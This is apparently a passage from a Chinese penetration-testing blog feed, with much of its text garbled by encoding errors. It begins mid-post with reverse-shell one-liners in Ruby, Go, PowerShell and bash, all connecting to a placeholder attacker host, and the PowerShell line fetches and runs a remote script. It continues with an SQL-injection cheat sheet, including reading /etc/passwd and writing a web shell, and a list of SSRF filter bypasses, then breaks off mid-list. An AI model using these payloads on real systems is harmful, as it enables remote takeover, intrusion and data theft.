åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash">ruby -rsocket -e<span class="token string">'f=TCPSocket.open("attackerip",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ä¾èµ–äº/bin/shï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">ruby -rsocket -e <span class="token string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœç›®æ ‡ç³»ç»Ÿè¿è¡Œ Windowsï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">ruby -rsocket -e <span class="token string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-Golang-åå¼¹"><a href="#9-Golang-åå¼¹" class="headerlink" title="9. Golang åå¼¹"></a>9. Golang åå¼¹</h4><pre class="line-numbers language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"bytes"</span>    <span class="token string">"net"</span>    <span class="token string">"os"</span>    <span class="token string">"os/exec"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    conn<span class="token punctuation">,</span> err <span class="token operator">:=</span> net<span class="token punctuation">.</span><span class="token function">Dial</span><span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">,</span> <span class="token string">"attackerip:443"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// è§£å†³cmdä¸­æ–‡ä¹±ç </span>    cn <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span> <span class="token string">"/C"</span><span class="token punctuation">,</span> <span class="token string">"chcp 65001"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// cmd/powershell</span>    <span class="token keyword">var</span> output bytes<span class="token punctuation">.</span>Buffer    cn<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> <span class="token operator">&amp;</span>output    cn<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// åå¼¹shell</span>    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// cmd/powershell</span>    cmd<span class="token punctuation">.</span>Stdin <span class="token operator">=</span> conn    cmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> conn    cmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> conn    cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-powershell-åå¼¹"><a href="#10-powershell-åå¼¹" class="headerlink" title="10. powershell åå¼¹"></a>10. powershell åå¼¹</h4><pre class="line-numbers language-bash"><code class="language-bash">powershell IEX <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Invoke-PowerShellTcp -Reverse -IPAddress attackerip -port 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="11-å…¶å®ƒ"><a href="#11-å…¶å®ƒ" class="headerlink" title="11. å…¶å®ƒ"></a>11. å…¶å®ƒ</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/attackerip/4444<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> åå¼¹Shell </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå¸¸ç”¨å‘½ä»¤-è„‘å›¾</title>
      <link href="/post/d71de17e.html"/>
      <url>/post/d71de17e.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/519483/1609411449351-a5c66a30-555d-44f9-8119-cd7592a57344.jpeg#align=left&amp;display=inline&amp;height=2900&amp;margin=%5Bobject%20Object%5D&amp;name=Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-%E8%84%91%E5%9B%BE.jpg&amp;originHeight=2900&amp;originWidth=3328&amp;size=1042649&amp;status=done&amp;style=none&amp;width=3328" alt="Linuxå¸¸ç”¨å‘½ä»¤-è„‘å›¾.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> å‘½ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFä¹‹ä¿¡æ¯æ”¶é›†-è„‘å›¾</title>
      <link href="/post/de12c44d.html"/>
      <url>/post/de12c44d.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-ä¹‹ä¿¡æ¯æ”¶é›†-è„‘å›¾"><a href="#CTF-ä¹‹ä¿¡æ¯æ”¶é›†-è„‘å›¾" class="headerlink" title="CTF ä¹‹ä¿¡æ¯æ”¶é›†-è„‘å›¾"></a>CTF ä¹‹ä¿¡æ¯æ”¶é›†-è„‘å›¾</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/519483/1609310704140-e079e5b7-775f-4f6c-819b-9b2cd2a276d7.jpeg#height=1512&amp;id=UyufX&amp;margin=%5Bobject%20Object%5D&amp;name=CTF%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%84%91%E5%9B%BE.jpg&amp;originHeight=1512&amp;originWidth=2478&amp;originalType=binary%E2%88%B6=1&amp;size=452785&amp;status=done&amp;style=none&amp;width=2478" alt="CTFä¹‹ä¿¡æ¯æ”¶é›†-è„‘å›¾.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEBå®‰å…¨ </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥</title>
      <link href="/post/e73517db.html"/>
      <url>/post/e73517db.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-æ³¨å…¥"><a href="#SQL-æ³¨å…¥" class="headerlink" title="SQL æ³¨å…¥"></a>SQL æ³¨å…¥</h1><p>æ³¨ï¼šä»¥ä¸‹å†…å®¹ä»¥ mysql ä¸ºä¾‹</p><h2 id="ä¸€ã€åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#ä¸€ã€åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="ä¸€ã€åˆ¤æ–­æ³¨å…¥ç‚¹"></a>ä¸€ã€åˆ¤æ–­æ³¨å…¥ç‚¹</h2><pre class="line-numbers language-plsql"><code class="language-plsql">or 1=1--+'or 1=1--+"or 1=1--+)or 1=1--+')or 1=1--+") or 1=1--+"))or 1=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒã€æ³¨é‡Šç¬¦"><a href="#äºŒã€æ³¨é‡Šç¬¦" class="headerlink" title="äºŒã€æ³¨é‡Šç¬¦"></a>äºŒã€æ³¨é‡Šç¬¦</h2><h3 id="1-å•è¡Œæ³¨é‡Š"><a href="#1-å•è¡Œæ³¨é‡Š" class="headerlink" title="1. å•è¡Œæ³¨é‡Š"></a>1. å•è¡Œæ³¨é‡Š</h3><ul><li>â€“+</li><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li></ul><h3 id="2-å¤šè¡Œæ³¨é‡Š"><a href="#2-å¤šè¡Œæ³¨é‡Š" class="headerlink" title="2. å¤šè¡Œæ³¨é‡Š"></a>2. å¤šè¡Œæ³¨é‡Š</h3><ul><li>/_ [SQ è¯­å¥] _/</li></ul><h2 id="ä¸‰ã€MySql-æ³¨å…¥å¸¸ç”¨ç³»ç»Ÿè¡¨"><a href="#ä¸‰ã€MySql-æ³¨å…¥å¸¸ç”¨ç³»ç»Ÿè¡¨" class="headerlink" title="ä¸‰ã€MySql æ³¨å…¥å¸¸ç”¨ç³»ç»Ÿè¡¨"></a>ä¸‰ã€MySql æ³¨å…¥å¸¸ç”¨ç³»ç»Ÿè¡¨</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1. information_schema"></a>1. information_schema</h3><p>ä»‹ç»ï¼šInformation_schema æ˜¯ mysql ä¸­è‡ªå¸¦çš„ä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“ä¸­åŒ…å«äº†å…¶ä»–æ•°æ®çš„å„ç§ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®åº“ä¸­çš„è¡¨åã€æƒé™ã€å­—æ®µåç­‰ã€‚</p><table><thead><tr><th><strong>æ•°æ®åº“</strong></th><th><strong>è¡¨å</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>information_schema</td><td>tables</td><td>mysql ä¸­å­˜å‚¨çš„å…¨éƒ¨è¡¨åï¼Œä½¿ç”¨ table_schema æŒ‡å®šæ•°æ®åº“å</td></tr><tr><td>information_schema</td><td>columns</td><td>mysql ä¸­å­˜å‚¨å…¨éƒ¨è¡¨çš„å­—æ®µåï¼Œä½¿ç”¨ table_name æŒ‡å®šè¡¨å</td></tr></tbody></table><h2 id="å››ã€åŸºæœ¬æ³¨å…¥æ­¥éª¤"><a href="#å››ã€åŸºæœ¬æ³¨å…¥æ­¥éª¤" class="headerlink" title="å››ã€åŸºæœ¬æ³¨å…¥æ­¥éª¤"></a>å››ã€åŸºæœ¬æ³¨å…¥æ­¥éª¤</h2><h3 id="1-è·å–å­—æ®µæ•°"><a href="#1-è·å–å­—æ®µæ•°" class="headerlink" title="1. è·å–å­—æ®µæ•°"></a>1. è·å–å­—æ®µæ•°</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># æ–¹æ³•ä¸€</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">6</span> æ­£ç¡®<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">7</span> é”™è¯¯<span class="token comment" spellcheck="true">## åˆ¤æ–­ï¼šå­—æ®µæ•°ä¸º6</span><span class="token comment" spellcheck="true"># æ–¹æ³•äºŒ</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>   æ­£ç¡®<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span> é”™è¯¯<span class="token comment" spellcheck="true">## åˆ¤æ–­ï¼šå­—æ®µæ•°ä¸º6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-è·å–æ•°æ®åº“ç”¨æˆ·å"><a href="#2-è·å–æ•°æ®åº“ç”¨æˆ·å" class="headerlink" title="2. è·å–æ•°æ®åº“ç”¨æˆ·å"></a>2. è·å–æ•°æ®åº“ç”¨æˆ·å</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-è·å–æ•°æ®åº“åç§°"><a href="#3-è·å–æ•°æ®åº“åç§°" class="headerlink" title="3. è·å–æ•°æ®åº“åç§°"></a>3. è·å–æ•°æ®åº“åç§°</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># å½“å‰æ•°æ®åº“åç§°</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># æ‰€æœ‰æ•°æ®åº“åç§°</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-å…¶å®ƒå†…ç½®å‡½æ•°"><a href="#4-å…¶å®ƒå†…ç½®å‡½æ•°" class="headerlink" title="4. å…¶å®ƒå†…ç½®å‡½æ•°"></a>4. å…¶å®ƒå†…ç½®å‡½æ•°</h3><pre class="line-numbers language-sql"><code class="language-sql">version<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true"># MySQLç‰ˆæœ¬</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true"># æ•°æ®åº“ç”¨æˆ·å</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                       <span class="token comment" spellcheck="true"># æ•°æ®åº“å</span>@<span class="token variable">@datadir</span>                        <span class="token comment" spellcheck="true"># æ•°æ®åº“è·¯å¾„</span>@<span class="token variable">@version_compile_os</span>             <span class="token comment" spellcheck="true"># æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span>sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span>                                     <span class="token comment" spellcheck="true"># å»¶æ—¶æ‰§è¡Œnç§’</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-è¯»å–å’Œå†™å…¥æ–‡ä»¶"><a href="#5-è¯»å–å’Œå†™å…¥æ–‡ä»¶" class="headerlink" title="5. è¯»å–å’Œå†™å…¥æ–‡ä»¶"></a>5. è¯»å–å’Œå†™å…¥æ–‡ä»¶</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># å¦‚æœç»“æœè¿”å›æ­£å¸¸ï¼Œè¯´æ˜å…·æœ‰è¯»å†™æƒé™</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># è¿”å›é”™è¯¯ï¼Œåº”è¯¥æ˜¯ç®¡ç†å‘˜å¯¹æ•°æ®åº“è´¦æˆ·é™æƒäº†</span><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># æ³¨ï¼šè¯»å–æ–‡ä»¶å¿…é¡»å°äºmax_allowed_packet</span><span class="token comment" spellcheck="true"># è¯»å–æ–‡ä»¶</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'D:/1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token comment" spellcheck="true">--+</span><span class="token comment" spellcheck="true"># å†™å…¥æ–‡ä»¶</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'shell code'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/shell.php'</span><span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-æŸ¥è¯¢è¡¨å"><a href="#6-æŸ¥è¯¢è¡¨å" class="headerlink" title="6. æŸ¥è¯¢è¡¨å"></a>6. æŸ¥è¯¢è¡¨å</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'DatabaseName'</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-æŸ¥è¯¢åˆ—å"><a href="#7-æŸ¥è¯¢åˆ—å" class="headerlink" title="7. æŸ¥è¯¢åˆ—å"></a>7. æŸ¥è¯¢åˆ—å</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'TableName'</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-æŸ¥è¯¢æ•°æ®"><a href="#8-æŸ¥è¯¢æ•°æ®" class="headerlink" title="8. æŸ¥è¯¢æ•°æ®"></a>8. æŸ¥è¯¢æ•°æ®</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äº”ã€SQL-å­—ç¬¦ä¸²å‡½æ•°"><a href="#äº”ã€SQL-å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="äº”ã€SQL å­—ç¬¦ä¸²å‡½æ•°"></a>äº”ã€SQL å­—ç¬¦ä¸²å‡½æ•°</h2><p>SQL å­—ç¬¦ä¸²å‡½æ•°ä¸»è¦ç”¨äºå­—ç¬¦ä¸²æ“ä½œã€‚<br><a href="https://www.yiibai.com/sql/sql-string-functions.html">ã€ŠSQL å­—ç¬¦ä¸²å‡½æ•°ã€‹</a></p><h2 id="æ›´å¤š"><a href="#æ›´å¤š" class="headerlink" title="æ›´å¤š"></a>æ›´å¤š</h2><ul><li><a href="https://paper.seebug.org/1665/">ã€ŠSQL æ³¨å…¥åŸç†åŠåˆ†æã€‹</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFç»•è¿‡æ–¹æ³•æ€»ç»“</title>
      <link href="/post/f66896bc.html"/>
      <url>/post/f66896bc.html</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-ç»•è¿‡æ–¹æ³•æ€»ç»“"><a href="#SSRF-ç»•è¿‡æ–¹æ³•æ€»ç»“" class="headerlink" title="SSRF ç»•è¿‡æ–¹æ³•æ€»ç»“"></a>SSRF ç»•è¿‡æ–¹æ³•æ€»ç»“</h1><h2 id="ä¸€ã€SSRF-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€ã€SSRF-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€ã€SSRF æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€ã€SSRF æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>ä¸€å¥è¯ä»‹ç»ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å†…éƒ¨å…¶ä»–æœåŠ¡</p><h2 id="äºŒã€ç»•è¿‡-127-0-0-1ã€localhostã€å…¶å®ƒå†…éƒ¨-IP"><a href="#äºŒã€ç»•è¿‡-127-0-0-1ã€localhostã€å…¶å®ƒå†…éƒ¨-IP" class="headerlink" title="äºŒã€ç»•è¿‡ 127.0.0.1ã€localhostã€å…¶å®ƒå†…éƒ¨ IP"></a>äºŒã€ç»•è¿‡ 127.0.0.1ã€localhostã€å…¶å®ƒå†…éƒ¨ IP</h2><ol><li>åˆ©ç”¨[::]ç»•è¿‡</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>[<span class="token punctuation">:</span><span class="token punctuation">:</span>]<span class="token punctuation">:</span><span class="token number">80</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token punctuation">:</span><span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>åˆ©ç”¨ 0000::ç»•è¿‡</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0000</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">80</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span class="token punctuation">:</span><span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ä½¿ç”¨åè¿›åˆ¶ IP å®šä½ç»•è¿‡</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0177.0</span><span class="token number">.0.1</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">2130706433</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">3232235521</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.0.1</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">3232235777</span><span class="token operator">/</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>ä½¿ç”¨ IPv6 / IPv4 åœ°å€åµŒå…¥ç»•è¿‡</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>[<span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span>ffff<span class="token punctuation">:</span><span class="token number">127.0</span><span class="token number">.0.1</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>åˆ é™¤ 0 æ¥ç®€åŒ– IP åœ°å€</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.1</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>åˆ©ç”¨ bash å˜é‡ç»•è¿‡ï¼ˆä»…é™ curlï¼‰</li></ol><pre class="line-numbers language-bash"><code class="language-bash">curl -v <span class="token string">"http://127<span class="token variable">$google</span>.0.0.1"</span><span class="token variable">$google</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># ç­‰äºcurl -v "http://127.0.0.1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="7"><li>åˆ©ç”¨@ç»•è¿‡</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>example.<span class="token keyword">com</span>@<span class="token number">127.0</span><span class="token number">.0.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="8"><li>åˆ©ç”¨ 302ã€301 é‡å®šå‘</li></ol><pre class="line-numbers language-basic"><code class="language-basic">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>dwz.cn<span class="token operator">/</span><span class="token number">11</span>SMa  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="9"><li>åˆ©ç”¨ DNS è§£æ</li></ol><p>å°† xxx.xxxx.com A è®°å½•è§£æåˆ° 127.0.0.1</p><ol start="10"><li>åˆ©ç”¨ Enclosed alphanumerics</li></ol><pre class="line-numbers language-basic"><code 